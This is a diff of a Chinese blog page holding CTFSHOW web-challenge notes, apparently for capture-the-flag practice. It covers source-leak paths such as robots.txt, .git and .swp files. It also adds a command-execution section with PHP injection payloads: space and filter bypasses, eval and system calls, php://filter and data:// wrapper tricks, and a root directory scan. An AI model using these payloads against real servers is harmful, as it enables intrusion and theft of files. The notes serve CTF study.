@@ -407,31 +407,36 @@ robots协议：Robots是网站跟爬虫间的协议，用简单直接的txt格�
         <div class="card-content article-card-content">
             <div id="articleContent">
                 <h1 id="CTFSHOW-web入门笔记"><a href="#CTFSHOW-web入门笔记" class="headerlink" title="CTFSHOW web入门笔记"></a>CTFSHOW web入门笔记</h1><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><ol>
-<li>robots协议：Robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。（Web4）<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/robots.txt</span><br></pre></td></tr></table></figure></li>
+<li>robots协议：Robots是网站跟爬虫间的协议，用简单直接的txt格式文本方式告诉对应的爬虫被允许的权限，也就是说robots.txt是搜索引擎中访问网站的时候要查看的第一个文件。当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根目录下是否存在robots.txt，如果存在，搜索机器人就会按照该文件中的内容来确定访问的范围；如果该文件不存在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保护的页面。因为一些系统中的URL是大小写敏感的，所以robots.txt的文件名应统一为小写。（Web4）</li>
+</ol>
+<p><font class="bg-color-2" style="background-color:#e91e63">url&#x2F;robots.txt</font></p>
+<ol start="2">
 <li>源码泄漏-phps源码泄露：phps即为 PHP Source，phps文件就是php的源代码文件，通常用于提供给用户（访问者）查看php代码，但是，并不是所有的php文件都存在.phps后缀 （Web5）</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.phps</span><br></pre></td></tr></table></figure>
+<p><font class="bg-color-2" style="background-color:#e91e63">url&#x2F;index.phps</font></p>
 <ol start="3">
-<li><a href="http://www.zip文件：">www.zip文件：</a> 网站的文件都是放置在www文件夹下面的，zip是一种压缩格式。也就是WWW文件夹里面的文件全部压缩在<a target="_blank" rel="noopener" href="http://www.zip里面了,访问url/www.zip%E5%8D%B3%E5%8F%AF%E6%89%BE%E5%88%B0%E8%BF%99%E4%B8%AA%E6%96%87%E4%BB%B6">www.zip里面了，访问url/www.zip即可找到这个文件</a> （Web6）</li>
+<li>www .zip文件： 网站的文件都是放置在www文件夹下面的，zip是一种压缩格式。也就是WWW文件夹里面的文件全部压缩在www .zip里面了，访问url&#x2F;www. zip即可找到这个文件 （Web6）</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/www.zip</span><br></pre></td></tr></table></figure>
+<p><font class="bg-color-2" style="background-color:#e91e63">url&#x2F;www .zip</font></p>
 <ol start="4">
 <li>版本控制工具-git源码泄露：版本控制最主要的功能就是追踪文件的变更。它将什么时候、什么人更改了文件的什么内容等信息忠实地了记录下来。每一次文件的改变，文件的版本号都将增加。除了记录版本变更外，版本控制的另一个重要功能是并行开发。软件开发往往是多人协同作业，版本控制可以有效地解决版本的同步以及不同开发者之间的开发通信问题，提高协同开发的效率。常用的版本控制工具有：git，svn，hg，cvs，towe。 （Web7、8）</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/.git 或者url/.svn 等等</span><br></pre></td></tr></table></figure>
+<p><font class="bg-color-2" style="background-color:#e91e63">url&#x2F;.git 或者url&#x2F;.svn 等等</font></p>
 <ol start="5">
 <li>生产环境：linux下vi&#x2F;vim异常关闭是会存留.swp文件</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/index.php.swp</span><br></pre></td></tr></table></figure>
-<ol start="6">
-<li><p>网页后台：当Web服务器接收到对某个末尾不含斜杠的url请求时，例如<a target="_blank" rel="noopener" href="https://www.baidu.com/test%EF%BC%8C%E8%BF%99%E6%97%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BC%9A%E6%90%9C%E7%B4%A2%E7%BD%91%E7%AB%99%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E6%9C%89%E6%B2%A1%E6%9C%89%E5%90%8D%E4%B8%BA%E2%80%9Ctest%E2%80%9D%E7%9A%84%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%B2%A1%E6%9C%89%E5%B0%B1%E6%8A%8Atest%E5%BD%93%E5%81%9A%E7%9B%AE%E5%BD%95%E5%A4%84%E7%90%86%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9Etest%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E9%BB%98%E8%AE%A4%E9%A6%96%E9%A1%B5%E3%80%82%E5%BD%93Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8E%A5%E6%94%B6%E5%88%B0%E7%9A%84%E6%98%AF%E6%9C%AB%E5%B0%BE%E5%B8%A6%E6%96%9C%E6%9D%A0%E7%9A%84%E8%AF%B7%E6%B1%82%E6%97%B6%E5%B0%B1%E4%BC%9A%E7%9B%B4%E6%8E%A5%E5%BD%93%E5%81%9A%E7%9B%AE%E5%BD%95%E5%A4%84%E7%90%86%E3%80%82%EF%BC%88Web12%EF%BC%89">https://www.baidu.com/test，这时服务器会搜索网站根目录下有没有名为“test”的文件，如果没有就把test当做目录处理，然后返回test目录下的默认首页。当Web服务器接收到的是末尾带斜杠的请求时就会直接当做目录处理。（Web12）</a></p>
-</li>
-<li><p>探针：互联网探针（NET probe），侦听网络数据包的网络探针称为互联网探针。数据包捕获、过滤、分析都能在“互联网探针”上实现。一般是用来检测服务器的运载负载情况的，以及检测服务器WEB环境软件版本兼容度的。比如我们有些时候WEB环境需要某个软件的某个版本支持，于是会用探针检测是否有安置和检测版本。常用php探针工具：phpinfo、雅黑探针、php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag。phpinfo函数是PHP最为常用的配置输出函数。phpinfo函数能够输出服务器PHP当前状态的大量信息，其中包含了PHP的编译选项、启用拓展、php版本信息、服务器信息、环境变量配置、HTTP头和PHP授权信息。</p>
-</li>
+<p><font class="bg-color-2" style="background-color:#e91e63">url&#x2F;index.php.swp<br></font><br>6. 网页后台：当Web服务器接收到对某个末尾不含斜杠的url请求时，例如https:&#x2F;&#x2F; www .baidu.com&#x2F; test，这时服务器会搜索网站根目录下有没有名为“test”的文件，如果没有就把test当做目录处理，然后返回test目录下的默认首页。当Web服务器接收到的是末尾带斜杠的请求时就会直接当做目录处理（Web12）</p>
+<ol start="7">
+<li>探针：互联网探针（NET probe），侦听网络数据包的网络探针称为互联网探针。数据包捕获、过滤、分析都能在“互联网探针”上实现。一般是用来检测服务器的运载负载情况的，以及检测服务器WEB环境软件版本兼容度的。比如我们有些时候WEB环境需要某个软件的某个版本支持，于是会用探针检测是否有安置和检测版本。常用php探针工具：phpinfo、雅黑探针、php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加&#x2F;tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag。phpinfo函数是PHP最为常用的配置输出函数。phpinfo函数能够输出服务器PHP当前状态的大量信息，其中包含了PHP的编译选项、启用拓展、php版本信息、服务器信息、环境变量配置、HTTP头和PHP授权信息。</li>
 </ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url/tz.php</span><br></pre></td></tr></table></figure>
+<p><font class="bg-color-2" style="background-color:#e91e63">url&#x2F;tz.php</font></p>
+<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>1.空格绕过：${IFS},%09,%20<br>2.system被过滤可以用passthru()<br>3.payload构造形式：</p>
+<p>?c&#x3D;system(“cat flag”);<br>?c&#x3D;eval($_GET{1});&amp;1&#x3D;system(‘cat flag.php’);<br>?c&#x3D;include$_GET[a]?&gt;&amp;a&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br>?c&#x3D;data :&#x2F;&#x2F;text&#x2F;plain,<?php%20system("tac%20f*");?><br>?c&#x3D;data :&#x2F;&#x2F;text&#x2F;plain;base64, PD9waHAgaW5jbHVkZSgnZmxhZy5waHAnKTtlY2hvICRmbGFnPz4&#x3D;<br>?c&#x3D;data :&#x2F;&#x2F;text&#x2F;plain,<?= system("cat fla*");?></p>
+<p>有&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1的时候：<br>?c&#x3D;tac flag.php||<br>?c&#x3D;nl&lt;fla’’g.php||</p>
+<p>当禁用了system exec popen passthru等函数时：<br>c&#x3D;highlight_file(“flag.php”);<br>c&#x3D;show_source(‘flag.php’);<br>c&#x3D;highlight_file(“&#x2F;flag.txt”);（flag的位置到根目录时）</p>
+<p>当读文件的函数不能用时：<br>c&#x3D;var_dump(scandir(“&#x2F;“));（查看根目录文件）<br>c&#x3D;include(“&#x2F;flag.txt”);<br>c&#x3D;include(‘&#x2F;flag.txt’);exit();</p>
+<p>c&#x3D;?&gt;<?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');}exit(0);?> (扫描根目录命令)</p>
 
-<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3>
                 
             </div>
             <hr/>
